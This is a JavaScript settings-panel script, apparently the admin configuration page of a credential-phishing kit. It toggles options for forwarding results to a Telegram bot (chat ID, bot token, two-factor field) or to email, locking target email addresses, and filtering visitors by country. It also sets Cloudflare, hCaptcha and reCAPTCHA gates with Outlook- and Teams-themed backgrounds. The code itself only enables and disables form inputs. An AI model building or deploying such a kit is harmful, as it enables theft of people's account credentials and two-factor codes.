class ConfigManager {
    constructor() {
        this.initializeElements();
        this.bindEvents();
        this.initializeStates();
    }

    initializeElements() {
        // Lock Email elements
        this.lockEmailSwitch = document.getElementById('lock_email');
        this.lockEmailInput = document.getElementById('lock_email_list');
        
        // Background elements
        this.selectElement = document.getElementById('background');
        this.customInput = document.getElementById('custom_background');
        
        // First message elements
        this.selectFirstMessage = document.getElementById('first_message');
        this.customFirstMessage = document.getElementById('custom_firstmessage');
        
        // hCaptcha background elements
        this.hcaptchaBackgroundSelect = document.getElementById('hcaptcha_background');
        this.hcaptchaCustomInput = document.getElementById('hcaptcha_custom_background');
        
        // Cloudflare background elements
        this.cloudflareBackgroundSelect = document.getElementById('cloudflare_background');
        this.cloudflareCustomInput = document.getElementById('cloudflare_custom_background');
        
        // Service switches
        this.telegramSwitch = document.getElementById('telegramsender');
        this.chatIdInput = document.getElementById('chatid');
        this.botTokenInput = document.getElementById('bottoken');
        this.twoFactorInput = document.getElementById('twofactor');
        
        this.emailSwitch = document.getElementById('emailsender');
        this.emailInput = document.getElementById('email');
        
        this.recaptchaSwitch = document.getElementById('captcha');
        this.publiclInput = document.getElementById('publickey');
        this.siteInput = document.getElementById('sitekey');
        this.scoreInput = document.getElementById('score');
        
        this.cloudflareSwitch = document.getElementById('cloudflare');
        this.pcloudlInput = document.getElementById('cloudpublickey');
        this.scloudInput = document.getElementById('cloudsitekey');
        this.icloudInput = document.getElementById('cloudinvisible');
        
        this.hcaptchaSwitch = document.getElementById('hcaptcha');
        this.phcaptchaInput = document.getElementById('hcaptchapublickey');
        this.shcaptchaInput = document.getElementById('hcaptchasitekey');
    }

    bindEvents() {
        // Lock email events
        if (this.lockEmailSwitch) {
            this.lockEmailSwitch.addEventListener('change', () => this.toggleLockInput());
        }
        
        // Background events
        if (this.selectElement) {
            this.selectElement.addEventListener('change', () => this.updateCustomBackgroundState());
        }
        
        if (this.selectFirstMessage) {
            this.selectFirstMessage.addEventListener('change', () => this.updateCustomFirstMessageState());
        }
        
        if (this.hcaptchaBackgroundSelect) {
            this.hcaptchaBackgroundSelect.addEventListener('change', () => this.updateHcaptchaCustomBackgroundState());
        }
        
        if (this.cloudflareBackgroundSelect) {
            this.cloudflareBackgroundSelect.addEventListener('change', () => this.updateCloudflareCustomBackgroundState());
        }
        
        // Service switches events
        if (this.telegramSwitch) {
            this.telegramSwitch.addEventListener('change', () => this.toggleTelegramInputs());
        }
        
        if (this.recaptchaSwitch) {
            this.recaptchaSwitch.addEventListener('change', () => this.toggleCaptchaInput());
        }
        
        if (this.emailSwitch) {
            this.emailSwitch.addEventListener('change', () => this.toggleEmailInputs());
        }
        
        if (this.cloudflareSwitch) {
            this.cloudflareSwitch.addEventListener('change', () => this.toggleCloudInputs());
        }
        
        if (this.hcaptchaSwitch) {
            this.hcaptchaSwitch.addEventListener('change', () => this.toggleHcaptchaInputs());
        }

        // Country selection buttons
        const checkAllBtn = document.getElementById('checkAll');
        const uncheckAllBtn = document.getElementById('uncheckAll');
        
        if (checkAllBtn) {
            checkAllBtn.addEventListener('click', () => {
                const checkboxes = document.querySelectorAll('input[type="checkbox"]');
                checkboxes.forEach(checkbox => checkbox.checked = true);
            });
        }
        
        if (uncheckAllBtn) {
            uncheckAllBtn.addEventListener('click', () => {
                const checkboxes = document.querySelectorAll('input[type="checkbox"]');
                checkboxes.forEach(checkbox => checkbox.checked = false);
            });
        }
    }

    initializeStates() {
        this.updateCustomBackgroundState();
        this.updateCustomFirstMessageState();
        this.updateHcaptchaCustomBackgroundState();
        this.updateCloudflareCustomBackgroundState();
        this.toggleLockInput();
        this.toggleTelegramInputs();
        this.toggleEmailInputs();
        this.toggleCaptchaInput();
        this.toggleCloudInputs();
        this.toggleHcaptchaInputs();
    }

    updateCustomBackgroundState() {
        if (this.selectElement && this.customInput) {
            this.customInput.disabled = this.selectElement.value !== 'custom';
        }
    }

    updateCustomFirstMessageState() {
        if (this.selectFirstMessage && this.customFirstMessage) {
            const value = this.selectFirstMessage.value;
            this.customFirstMessage.disabled = !(value === 'images' || value === 'text');
        }
    }

    updateHcaptchaCustomBackgroundState() {
        if (!this.hcaptchaBackgroundSelect || !this.hcaptchaCustomInput) return;
        
        const selectedValue = this.hcaptchaBackgroundSelect.value;
        const needsCustomInput = ['custom', 'url', 'images'].includes(selectedValue);
        
        this.hcaptchaCustomInput.disabled = !needsCustomInput;
        
        if (needsCustomInput) {
            const placeholders = {
                'custom': 'Enter image filename (put in page/images/ folder)',
                'url': 'Enter image URL (e.g., https://example.com/image.jpg)',
                'images': 'Enter theme name (outlook, teams) or filename (image.png)'
            };
            this.hcaptchaCustomInput.placeholder = placeholders[selectedValue] || 'Enter image filename or URL';
        }
    }

    updateCloudflareCustomBackgroundState() {
        if (!this.cloudflareBackgroundSelect || !this.cloudflareCustomInput) return;
        
        const selectedValue = this.cloudflareBackgroundSelect.value;
        const needsCustomInput = ['custom', 'url', 'images'].includes(selectedValue);
        
        this.cloudflareCustomInput.disabled = !needsCustomInput;
        
        if (needsCustomInput) {
            const placeholders = {
                'custom': 'Enter image filename (put in page/images/ folder)',
                'url': 'Enter image URL (e.g., https://example.com/image.jpg)',
                'images': 'Enter theme name (outlook, teams) or filename (image.png)'
            };
            this.cloudflareCustomInput.placeholder = placeholders[selectedValue] || 'Enter image filename or URL';
        }
    }

    toggleLockInput() {
        if (this.lockEmailSwitch && this.lockEmailInput) {
            this.lockEmailInput.disabled = !this.lockEmailSwitch.checked;
        }
    }

    toggleTelegramInputs() {
        if (!this.telegramSwitch) return;
        
        const isEnabled = this.telegramSwitch.checked;
        [this.chatIdInput, this.botTokenInput, this.twoFactorInput].forEach(input => {
            if (input) input.disabled = !isEnabled;
        });
    }

    toggleCaptchaInput() {
        if (!this.recaptchaSwitch) return;
        
        const isEnabled = this.recaptchaSwitch.checked;
        [this.publiclInput, this.siteInput, this.scoreInput].forEach(input => {
            if (input) input.disabled = !isEnabled;
        });
    }

    toggleCloudInputs() {
        if (!this.cloudflareSwitch) return;
        
        const isEnabled = this.cloudflareSwitch.checked;
        [this.pcloudlInput, this.scloudInput, this.icloudInput].forEach(input => {
            if (input) input.disabled = !isEnabled;
        });
        
        const backgroundSelect = document.getElementById('cloudflare_background');
        if (backgroundSelect) {
            backgroundSelect.disabled = !isEnabled;
            if (isEnabled) {
                this.updateCloudflareCustomBackgroundState();
            } else if (this.cloudflareCustomInput) {
                this.cloudflareCustomInput.disabled = true;
            }
        }
    }

    toggleHcaptchaInputs() {
        if (!this.hcaptchaSwitch) return;
        
        const isEnabled = this.hcaptchaSwitch.checked;
        [this.phcaptchaInput, this.shcaptchaInput].forEach(input => {
            if (input) input.disabled = !isEnabled;
        });
        
        const difficultySelect = document.getElementById('hcaptcha_difficulty');
        const backgroundSelect = document.getElementById('hcaptcha_background');
        
        if (difficultySelect) difficultySelect.disabled = !isEnabled;
        if (backgroundSelect) {
            backgroundSelect.disabled = !isEnabled;
            if (isEnabled) {
                this.updateHcaptchaCustomBackgroundState();
            } else if (this.hcaptchaCustomInput) {
                this.hcaptchaCustomInput.disabled = true;
            }
        }
    }

    toggleEmailInputs() {
        if (this.emailSwitch && this.emailInput) {
            this.emailInput.disabled = !this.emailSwitch.checked;
        }
    }
}

// Initialize when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    new ConfigManager();
});
